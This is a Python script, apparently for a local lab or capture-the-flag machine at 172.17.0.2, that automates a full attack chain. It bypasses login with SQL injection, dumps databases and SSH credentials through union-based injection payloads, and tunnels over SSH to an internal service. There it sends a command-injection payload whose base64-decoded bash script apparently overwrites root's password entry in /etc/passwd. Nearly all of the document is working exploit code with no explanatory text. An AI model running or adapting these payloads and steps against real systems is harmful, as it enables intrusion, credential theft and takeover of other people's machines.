import requests
import subprocess
from bs4 import BeautifulSoup
from pwn import *
import time
import os
from sshtunnel import SSHTunnelForwarder


def main():
    rojo = "\033[1;31m"
    verde = "\033[1;32m"
    amarillo = "\033[1;33m"
    reset = "\033[0m"
    main_url = 'http://172.17.0.2/dashboard.php'
    r = requests.get(main_url, allow_redirects=False)
    if r.status_code != 200:
        print(f"{rojo}[!] {amarillo}El código no fue de 200... \n{verde}[+] {amarillo}Iniciando sesión...{reset}")
        phpsessid = iniciar_sesion()
        print(f"{verde}[+] {amarillo}Extrayendo base de datos...")
        user, password = dump_db(phpsessid)
        print(f"{verde}[+] {rojo}Escalando a root...{reset}")
        got_root(user, password)
        print(f"{amarillo}\n\nPwn3d!\n\n")
        print(f"{rojo}[!] {amarillo}Puede conectarse como el usuario {rojo}{user} {amarillo}y la contraseña {rojo}{password}\n{rojo}[!]{amarillo} Ejecutando 'su' y con la contraseña {rojo}'maci' {amarillo}podrá escalar a root")
        





def iniciar_sesion():
    login_url = "http://172.17.0.2/login.php"
    credentials = {
        "username": "admin' or 1=1-- -",
        "password": "nada"
    }

    l = requests.post(login_url, data=credentials, allow_redirects=False)
    PHPSESSID = l.cookies['PHPSESSID']
    

    return PHPSESSID


def dump_db(PHPSESSID):
    cookies = {
        "PHPSESSID": "%s" % (PHPSESSID),
    }
    

    payloads = {
        "db": "test' union select 1,2,database(),4,5-- -",
        "all_db": "test' union select 1,2,group_concat(schema_name),4,5 from information_schema.schemata-- -",
        "secret_db_tables": "test' union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema='secret_db'-- -",
        "secret_db_columns":  "test' union select 1,2,group_concat(column_name),4,5 from information_schema.columns where table_schema='secret_db' and table_name='secret'-- -",
        "ssh_credentials": "test' union select 1,2,group_concat(ssh_users,':',ssh_pass),4,5 from secret_db.secret-- -"
    }

    for payload in payloads.values():
            p1 = log.progress("SQLI")
            url = f"http://172.17.0.2/dashboard.php?search_term={payload}"
            r = requests.get(url, cookies=cookies)
            soup = BeautifulSoup(r.text, 'html.parser')
            p_tag = soup.find('p')
            text = p_tag.get_text(strip=True)
            dump = text.replace('By: ', '')
            p1.status(dump)
            time.sleep(2)

    user, password = dump.split(':')

    return user, password

def got_root(user, password):
    forward = SSHTunnelForwarder(('172.17.0.2', 22), ssh_username=user, ssh_password=password, remote_bind_address=('127.0.0.1', 8888), local_bind_address=('127.0.0.1', 2727))
    forward.start()
    local_url = 'http://localhost:2727/index.php'
    payload = { 
        "command": "echo IyEvYmluL2Jhc2gKcGFzc3dvcmQ9IlwkMVwkcU9GQ0xoaWRcJEVHM0d5TkJQSk93MGJ1Vm1OSFlVMzAiCnNlZCBzL3Jvb3Q6eDovcm9vdDokcGFzc3dvcmQ6L2cgLWkgL2V0Yy9wYXNzd2QK > /tmp/a && base64 -d /tmp/a > /tmp/b && bash /tmp/b ;",
    }
    r = requests.post(local_url, data=payload)



if __name__ == '__main__':
    main()
